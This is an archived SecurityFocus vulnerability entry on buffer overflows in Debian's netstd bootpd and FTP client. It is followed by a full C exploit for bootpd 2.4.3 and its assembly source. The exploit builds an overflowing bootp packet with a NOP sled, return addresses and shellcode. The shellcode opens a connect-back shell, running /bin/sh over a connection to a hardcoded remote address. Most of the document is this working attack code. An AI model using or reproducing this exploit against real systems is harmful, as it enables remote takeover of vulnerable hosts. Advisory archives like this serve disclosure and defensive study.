source: http://www.securityfocus.com/bid/324/info

The netstd package, included with the Debian GNU/Linux distribution is vulnerable to two buffer overflow attacks. The first is in the bootp server, the second in the FTP client.

Bootpd version 2.4.3(and earlier) is prone to a number of buffer overflow conditions that may allow a remote attacker to fully compromise a host running a vulnerable version. This is due to improper bounds checking in the handling of the boot file/location specified in a bootp request packet, and in the error
logging facility. This vulnerability is specific to the bootp daemon and any Unix distributions that ship with the affected version should be considered vulnerable.

A buffer overflow condition also exists in the netstd FTP client, which may be exploited by a local attacker to potentially elevate privileges.

/*
 * Bootpd Exploit against debian linux 1.3 and 2.0 and possibly other
 *
 * (C) 1998  Willem Pinckaers W.H.J.Pinckaers@cpedu.rug.nl
 *
 */

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "bootp.h"

char shellcode[] =
"\x31" "\xc9" "\x89" "\xc8" "\x04" "\x66" "\x41" "\x89" "\xca" "\x89" "\xcb"
"\xeb" "\x7f" "\x5f" "\x89" "\x4f" "\x08" "\x41" "\x89" "\x4f" "\x04" "\x80"
"\xc1" "\x04" "\x89" "\x4f" "\x0c" "\x8d" "\x4f" "\x04" "\xcd" "\x80" "\x89"
"\x07" "\x31" "\xc9" "\x80" "\xc1" "\x02" "\x66" "\x89" "\x4f" "\x0c" "\x66"
"\x89" "\x4f" "\x0e" "\x80" "\xc1" "\x0e" "\x66" "\x89" "\x4f" "\x08" "\x66"
"\xb9" "\x30" "\x39" "\x66" "\x89" "\x4f" "\x0e" "\x8d" "\x47" "\x0c" "\x89"
"\x47" "\x04" "\x31" "\xc9" "\xb1" "\x03" "\x89" "\xca" "\x89" "\xcb" "\x89"
"\xf9" "\x31" "\xc0" "\x04" "\x66" "\xcd" "\x80" "\x31" "\xc0" "\x89" "\xc1"
"\x04" "\x3f" "\x89" "\xc2" "\x8b" "\x1f" "\xcd" "\x80" "\x89" "\xd0" "\x41"
"\xcd" "\x80" "\x89" "\xd0" "\x41" "\xcd" "\x80" "\x31" "\xc0" "\x89" "\x47"
"\x10" "\x88" "\x47" "\x1b" "\x8d" "\x47" "\x14" "\x89" "\x47" "\x0c" "\x31"
"\xc0" "\x04" "\x0b" "\x8d" "\x5f" "\x14" "\x8d" "\x4f" "\x0c" "\x8d" "\x57"
"\x10" "\xcd" "\x80" "\x31" "\xc0" "\x40" "\xcd" "\x80" "\xe8" "\x7c" "\xff"
"\xff" "\xff" "\x2e" "\x41" "\x41" "\x41" "\x41" "\x41" "\x41" "\x41" "\x41"
"\x41" "\x41" "\x41" "\x41" "\x41" "\x39" "\x30" "\xc0" "\xa8" "\x01" "\x01"
"\x2f" "\x62" "\x69" "\x6e" "\x2f" "\x73" "\x68" "\x00";

#define SERVER_PORT     67

char client_addr[16] = "127.000.000.001";
char host_addr[16] = "127.000.000.001";
int realpath_adjust = 0;
int exploit_length = 1200;


struct sockaddr_in server_addr;
void sendpacket(int, struct bootp *);
void build_packet(struct bootp *, int, char**);
void get_args(int, char**);
void usage(void);

int main(int argc, char *argv[])
{
    struct bootp* bp;
    int s;

    get_args(argc, argv);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(host_addr);


    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        fprintf(stderr, "cannot create socket\n");
        exit(1);
    }
    if ((bp = (struct bootp*) malloc(MAX_MSG_SIZE + 1000)) == NULL) {
        (void) fprintf(stderr, "Cannot malloc.\n");
        exit(1);
    };
    (void) memset(bp, 0, MAX_MSG_SIZE + 1000); /* ai exploit isn't secure */
    build_packet(bp, argc, argv);

    sendpacket(s, bp);
}

void sendpacket(int s, struct bootp *bp)
{
    if (sendto(s, (const void *) bp, MAX_MSG_SIZE, 0,
      (const struct sockaddr *) &server_addr,
      sizeof(struct sockaddr_in)) == -1) {
        fprintf(stderr, "sendpacket: sendto returned -1 ;(\n");
        exit(1);
    }
}

void build_packet(struct bootp *bp, int argc, char *argv[])
{
    unsigned long start_realpath = 0xbffff684 + realpath_adjust;
    unsigned long addr_ret_addr = start_realpath + 8 + 0x488;
    unsigned long temp_addr, temp_addr2 = 0;
    int length_tftpdir = 1;    // no ftpdir just a slash at the start..
    int num_nops = 600;
    char *p;
    unsigned long *q;
    int i;

    bp->bp_op = BOOTREQUEST;
    bp->bp_xid = 58524;
    bp->bp_htype = HTYPE_ETHERNET;
    bp->bp_hlen = 6;
    bp->bp_ciaddr.s_addr = inet_addr(client_addr);

    printf("Using: client: %s\n", client_addr);
    printf("Using: server: %s\n", host_addr);
    printf("Addr of realpath: %x\n", start_realpath);
    p = bp->bp_file;
/* Putting in nops */
    for (i = 0; i < num_nops; i++)
        *p++ = 0x90;
    printf("Added: %d nops\n", num_nops);

/* Putting in shellcode */
    for(i = 0; i < strlen(shellcode); i++)
        *p++ = shellcode[i];
    printf("%d bytes of shellcode added.\n", strlen(shellcode));

/* Aligning to make sure the ret_addr is placed correctly */
    temp_addr = p - bp->bp_file + length_tftpdir + start_realpath;
    for(i = 0; i < (addr_ret_addr - temp_addr) % 4; i++)
        *p++ = 'a';
    printf("%d bytes of alignment added.\n", (addr_ret_addr - temp_addr) %4);

/* set return adress.. hopefully in exploit code.... */
    temp_addr2 = start_realpath + length_tftpdir + (num_nops / 2);
    if (!(temp_addr2 & 0xff)) temp_addr2++;
    printf("Setting return addr to: %x \n", temp_addr2);
    q = (unsigned long *) p;
    do {
        *q++ = temp_addr2;
        p = (char *) q;
    } while ((p - bp->bp_file) < exploit_length);
    *p++ = '\0';
   printf("Exploit length: %d", strlen(bp->bp_file));
}

void get_args(int argc, char *argv[])
{
    int ch;
    while ((ch = getopt(argc, argv, "c:s:a:e:")) != EOF) {
        switch(ch) {
            case 'c':
                strcpy(client_addr, optarg);
                break;
            case 's':
                strcpy(host_addr, optarg);
                break;
            case 'a':
                realpath_adjust = atoi(optarg);
                break;
            case 'e':
                exploit_length = atoi(optarg);
                break;
            default:
                usage();
        }
    }
}

void usage(void)
{
    printf("bootpd exploit against debian linux 1.3 and 2.0 (probably others)\n");
    printf("\nBy Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl) 1998\n");
    printf("\nUsage:\n\tbootpd: -c client_addr -s server_addr -a offset\n");
    exit(1);
}
--------- CUT HERE ---------
--------- CUT HERE ---------
/*
 * Exploit code, casts a shell to a remote host
 * (C) 1998 Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl
 */
void main()
{
    __asm__("
                xorl %ecx, %ecx
                movl %ecx, %eax
                addb $0x66, %al
                incl %ecx
                movl %ecx, %edx
                movl %ecx, %ebx
                jmp endc0de
                realstart:
                popl %edi
                movl %ecx,0x08(%edi)
                incl %ecx
                movl %ecx,0x04(%edi)
                addb $04,%cl
                movl %ecx,0x0c(%edi)
                leal 04(%edi), %ecx
                int $0x80
                movl %eax, (%edi)
                xorl %ecx, %ecx
                addb $02, %cl
                movw %cx, 0xc(%edi)
                movw %cx, 0xe(%edi)
                addb $0x0e, %cl
                movw %cx, 0x8(%edi)
                movw $0x3930, %cx
                movw %cx, 0xe(%edi)
                leal 0x0c(%edi), %eax
                movl %eax, 0x04(%edi)
                xorl %ecx, %ecx
                movb $03, %cl
                movl %ecx, %edx
                movl %ecx, %ebx
                movl %edi, %ecx
                xorl %eax, %eax
                addb $0x66, %al
                int $0x080              // connect
                xorl %eax,%eax
                movl %eax, %ecx
                addb $0x3f, %al
                movl %eax, %edx
                movl (%edi), %ebx
                int $0x80               // dup2
                movl %edx, %eax
                incl %ecx
                int $0x80               // dup2
                movl %edx, %eax
                incl %ecx
                int $0x80               // dup2
                xorl %eax, %eax
                movl %eax, 0x10(%edi)           // pointer = NULL
                movb %al, 0x1b(%edi)            // terminate /bin/sh
                leal 0x14(%edi), %eax           // start van /bin/sh
                movl %eax, 0x0c(%edi)
                xorl %eax, %eax
                addb $0x0b, %al
                leal 0x14(%edi), %ebx
                leal 0x0c(%edi), %ecx
                leal 0x10(%edi), %edx
                int $0x80                       // execve
                xorl %eax,%eax
                incl %eax
                int $0x80
                endc0de:
                call realstart
                sockfd:
                .byte 0x2e, 'A', 'A', 'A'
                .byte 'A', 'A', 'A', 'A'
                .byte 'A', 'A', 'A', 'A'
                sockaddr:
                .byte 'A', 'A'                  // must contain 02
                .byte 0x39, 0x30                // must contain port nr
                .byte 192, 168, 01, 01          // must contain ip
                .string \"/bin/sh\"");
}
